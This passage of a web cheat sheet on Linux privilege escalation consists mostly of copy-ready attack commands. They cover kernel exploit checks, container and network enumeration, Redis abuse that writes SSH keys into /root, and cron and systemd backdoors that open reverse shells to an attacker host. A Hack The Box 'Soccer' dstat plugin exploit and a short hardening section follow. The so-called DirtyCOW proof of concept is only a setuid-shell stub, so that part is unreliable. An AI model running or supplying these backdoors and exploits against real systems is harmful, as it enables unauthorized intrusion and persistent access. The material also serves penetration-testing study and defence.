+</span></span><span class="line"><span class="cl">cp /bin/bash /tmp/allowed_binary_name
+</span></span></code></pre></div><hr>
+<h2 id="kernel-and-system-exploits">Kernel and System Exploits</h2>
+<h3 id="kernel-version-checking">Kernel Version Checking</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Kernel version</span>
+</span></span><span class="line"><span class="cl">uname -r
+</span></span><span class="line"><span class="cl">cat /proc/version
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for known kernel exploits</span>
+</span></span><span class="line"><span class="cl">searchsploit linux kernel <span class="k">$(</span>uname -r<span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Distribution-specific exploits</span>
+</span></span><span class="line"><span class="cl">lsb_release -a
+</span></span><span class="line"><span class="cl">cat /etc/os-release
+</span></span></code></pre></div><h3 id="common-kernel-exploits">Common Kernel Exploits</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dirty COW (CVE-2016-5195)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Affects Linux kernel versions 2.6.22 to 4.8.3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># DirtyCOW PoC</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;int main() { setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39;</span> &gt; /tmp/cow.c
+</span></span><span class="line"><span class="cl">gcc -o /tmp/cow /tmp/cow.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for vulnerable kernel</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>uname -r <span class="p">|</span> cut -d. -f1-2<span class="k">)</span> &lt; <span class="s2">&#34;4.9&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Potentially vulnerable to DirtyCOW&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><hr>
+<h2 id="container-escape-techniques">Container Escape Techniques</h2>
+<h3 id="docker-container-detection">Docker Container Detection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check if running in container</span>
+</span></span><span class="line"><span class="cl">cat /proc/1/cgroup <span class="p">|</span> grep docker
+</span></span><span class="line"><span class="cl">ls -la /.dockerenv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for container runtime</span>
+</span></span><span class="line"><span class="cl">ps aux <span class="p">|</span> grep -E <span class="s2">&#34;(docker|containerd|runc)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check capabilities</span>
+</span></span><span class="line"><span class="cl">/sbin/getcap -r / 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">capsh --print
+</span></span></code></pre></div><h3 id="container-privilege-escalation">Container Privilege Escalation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for privileged container</span>
+</span></span><span class="line"><span class="cl">cat /proc/self/status <span class="p">|</span> grep Cap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for host filesystem mounts</span>
+</span></span><span class="line"><span class="cl">mount <span class="p">|</span> grep -E <span class="s2">&#34;/(proc|sys|dev)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Look for Docker socket</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;docker.sock&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check for host processes visible</span>
+</span></span><span class="line"><span class="cl">ps aux <span class="p">|</span> wc -l
+</span></span></code></pre></div><hr>
+<h2 id="network-based-privilege-escalation">Network-Based Privilege Escalation</h2>
+<h3 id="internal-network-discovery">Internal Network Discovery</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Network interfaces</span>
+</span></span><span class="line"><span class="cl">ip addr show
+</span></span><span class="line"><span class="cl">ifconfig -a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ARP table</span>
+</span></span><span class="line"><span class="cl">arp -a
+</span></span><span class="line"><span class="cl">ip neigh show
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Network connections</span>
+</span></span><span class="line"><span class="cl">ss -tulnp
+</span></span><span class="line"><span class="cl">netstat -tulnp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Port scanning internal network</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> ping -c <span class="m">1</span> 192.168.1.<span class="nv">$i</span> <span class="p">&amp;</span>&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;192.168.1.</span><span class="nv">$i</span><span class="s2"> is up&#34;</span><span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></div><h3 id="service-exploitation">Service Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for internal services</span>
+</span></span><span class="line"><span class="cl">nmap -sT -O localhost
+</span></span><span class="line"><span class="cl">ss -tlnp <span class="p">|</span> grep LISTEN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Database connections</span>
+</span></span><span class="line"><span class="cl">mysql -u root -p
+</span></span><span class="line"><span class="cl">psql -U postgres
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Redis exploitation</span>
+</span></span><span class="line"><span class="cl">redis-cli
+</span></span><span class="line"><span class="cl">CONFIG GET dir
+</span></span><span class="line"><span class="cl">CONFIG SET dir /root/.ssh
+</span></span><span class="line"><span class="cl">CONFIG SET dbfilename authorized_keys
+</span></span><span class="line"><span class="cl">SET crackit <span class="s2">&#34;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34;</span>
+</span></span><span class="line"><span class="cl">SAVE
+</span></span></code></pre></div><hr>
+<h2 id="persistence-mechanisms">Persistence Mechanisms</h2>
+<h3 id="ssh-key-injection">SSH Key Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate SSH key pair</span>
+</span></span><span class="line"><span class="cl">ssh-keygen -t rsa -f /tmp/key
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add public key to authorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34;</span> &gt;&gt; /home/user/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set proper permissions</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /root/.ssh
+</span></span></code></pre></div><h3 id="cron-job-backdoors">Cron Job Backdoors</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add malicious cron job</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;* * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; /etc/crontab
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># User-specific cron</span>
+</span></span><span class="line"><span class="cl">crontab -e
+</span></span><span class="line"><span class="cl"><span class="c1"># Add: * * * * * /path/to/backdoor</span>
+</span></span></code></pre></div><h3 id="service-backdoors">Service Backdoors</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create systemd service</span>
+</span></span><span class="line"><span class="cl">cat &gt; /etc/systemd/system/backdoor.service <span class="s">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">[Unit]
+</span></span></span><span class="line"><span class="cl"><span class="s">Description=System Backdoor
+</span></span></span><span class="line"><span class="cl"><span class="s">After=network.target
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s">Type=simple
+</span></span></span><span class="line"><span class="cl"><span class="s">User=root
+</span></span></span><span class="line"><span class="cl"><span class="s">ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">Restart=always
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s">WantedBy=multi-user.target
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">systemctl <span class="nb">enable</span> backdoor.service
+</span></span><span class="line"><span class="cl">systemctl start backdoor.service
+</span></span></code></pre></div><hr>
+<h2 id="automated-enumeration-tools">Automated Enumeration Tools</h2>
+<h3 id="linpeas">LinPEAS</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Download and run LinPEAS</span>
+</span></span><span class="line"><span class="cl">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh <span class="p">|</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Or transfer and run</span>
+</span></span><span class="line"><span class="cl">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span><span class="line"><span class="cl">chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">./linpeas.sh
+</span></span></code></pre></div><h3 id="linenum">LinEnum</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Download LinEnum</span>
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+</span></span><span class="line"><span class="cl">chmod +x LinEnum.sh
+</span></span><span class="line"><span class="cl">./LinEnum.sh
+</span></span></code></pre></div><h3 id="lse-linux-smart-enumeration">LSE (Linux Smart Enumeration)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Download and run LSE</span>
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+</span></span><span class="line"><span class="cl">chmod +x lse.sh
+</span></span><span class="line"><span class="cl">./lse.sh -l1  <span class="c1"># Level 1 checks</span>
+</span></span><span class="line"><span class="cl">./lse.sh -l2  <span class="c1"># Level 2 checks</span>
+</span></span></code></pre></div><hr>
+<h2 id="real-world-example-soccer-htb-doasdstat">Real-World Example: Soccer HTB doas/dstat</h2>
+<h3 id="initial-discovery">Initial Discovery</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Found user can write to dstat plugin directory</span>
+</span></span><span class="line"><span class="cl">player@soccer:/usr/local/share$ find / -group player 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;^/proc\|^/run\|^/sys&#39;</span>
+</span></span><span class="line"><span class="cl">/usr/local/share/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check doas configuration</span>
+</span></span><span class="line"><span class="cl">player@soccer:~$ cat /usr/local/etc/doas.conf
+</span></span><span class="line"><span class="cl">permit nopass player as root cmd /usr/bin/dstat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check directory permissions</span>
+</span></span><span class="line"><span class="cl">player@soccer:/usr/local/share$ ls -la
+</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root player <span class="m">4096</span> Dec <span class="m">12</span>  <span class="m">2022</span> dstat
+</span></span></code></pre></div><h3 id="exploitation">Exploitation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create malicious dstat plugin</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39;</span> &gt; /usr/local/share/dstat/dstat_exploit.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Execute with doas</span>
+</span></span><span class="line"><span class="cl">doas /usr/bin/dstat --exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Alternative method using GTFOBins reference</span>
+</span></span><span class="line"><span class="cl">mkdir -p ~/.dstat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39;</span> &gt; ~/.dstat/dstat_exploit.py
+</span></span><span class="line"><span class="cl">doas /usr/bin/dstat --exploit
+</span></span></code></pre></div><hr>
+<h2 id="prevention-and-hardening">Prevention and Hardening</h2>
+<h3 id="secure-configuration-practices">Secure Configuration Practices</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Proper doas configuration</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Use specific commands only, avoid wildcards</span>
+</span></span><span class="line"><span class="cl">permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Secure sudo configuration</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Avoid NOPASSWD where possible</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Use command aliases for complex commands</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Regularly audit sudo rules</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># File permission hardening</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Remove world-writable permissions</span>
+</span></span><span class="line"><span class="cl">find / -type d -perm -002 -exec chmod o-w <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">find / -type f -perm -002 -exec chmod o-w <span class="o">{}</span> <span class="se">\;</span>
+</span></span></code></pre></div><h3 id="monitoring-and-detection">Monitoring and Detection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Monitor privilege escalation attempts</span>
+</span></span><span class="line"><span class="cl">auditctl -w /etc/passwd -p wa -k passwd_changes
+</span></span><span class="line"><span class="cl">auditctl -w /etc/shadow -p wa -k shadow_changes
+</span></span><span class="line"><span class="cl">auditctl -w /etc/sudoers -p wa -k sudo_changes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Log sudo/doas usage</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Configure proper logging in /etc/sudoers or doas.conf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># File integrity monitoring</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Use tools like AIDE or Tripwire to monitor critical files</span>
+</span></span></code></pre></div><hr>
+<p><em>Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.</em></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <nav class="paginav">
+      Tags:
+      <a class="tag" href="https://realspaceeagle.github.io/tags/linux/"># Linux</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/privilege-escalation/"># Privilege-Escalation</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/pentesting/"># Pentesting</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/doas/"># Doas</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/sudo/"># Sudo</a>
+    </nav>
+  </footer>
+</article>
+
+<style>
+.breadcrumbs {
+  font-size: 0.875rem;
+  color: var(--secondary);
+  margin-bottom: 1rem;
+}
+
+.breadcrumbs a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+.breadcrumbs a:hover {
+  text-decoration: underline;
+}
+
+.post-description {
+  font-size: 1.125rem;
+  color: var(--secondary);
+  margin: 1rem 0 2rem 0;
+  font-style: italic;
+}
+
+.post-tags a {
+  display: inline-block;
+  background: var(--code-bg);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.post-tags a:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+.tag {
+  display: inline-block;
+  background: var(--tertiary);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.tag:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+ 
+.cheatsheet-page pre {
+  position: relative;
+  font-size: 0.9rem;
+}
+
+.cheatsheet-page pre code {
+  display: block;
+  padding: 0;
+  margin-left: 0;
+}
+
+ 
+.cheatsheet-page pre::after {
+  content: "Copy";
+  position: absolute;
+  top: 0.5rem;
+  right: 0.5rem;
+  background: rgba(255, 255, 255, 0.1);
+  color: #fff;
+  padding: 0.25rem 0.5rem;
+  border-radius: 4px;
+  font-size: 0.75rem;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+.cheatsheet-page pre:hover::after {
+  opacity: 1;
+}
+
+ 
+.cheatsheet-page ul li a {
+  color: var(--primary);
+  text-decoration: none;
+  padding: 0.25rem 0;
+  display: block;
+  transition: color 0.2s ease;
+}
+
+.cheatsheet-page ul li a:hover {
+  color: var(--tertiary);
+  padding-left: 0.5rem;
+}
+</style>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+  const codeBlocks = document.querySelectorAll('.cheatsheet-page pre');
+  
+  codeBlocks.forEach(block => {
+    block.addEventListener('click', function(e) {
+      if (e.target === this || e.target.tagName === 'CODE') {
+        const code = this.querySelector('code');
+        if (code) {
+          navigator.clipboard.writeText(code.textContent).then(() => {
+            const button = this.querySelector('::after') || this;
+            const originalContent = button.textContent;
+            
+            
+            this.style.borderLeftColor = '#10b981';
+            setTimeout(() => {
+              this.style.borderLeftColor = '#2563eb';
+            }, 300);
+          });
+        }
+      }
+    });
+  });
+
+  
+  const headers = document.querySelectorAll('.cheatsheet-page h2, .cheatsheet-page h3');
+  headers.forEach(header => {
+    const id = header.textContent.toLowerCase()
+      .replace(/[^a-z0-9\s-]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '');
+    
+    header.id = id;
+    header.style.cursor = 'pointer';
+    
+    header.addEventListener('click', () => {
+      window.location.hash = '#' + id;
+      navigator.clipboard.writeText(window.location.href);
+    });
+  });
+});
+</script>
+
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
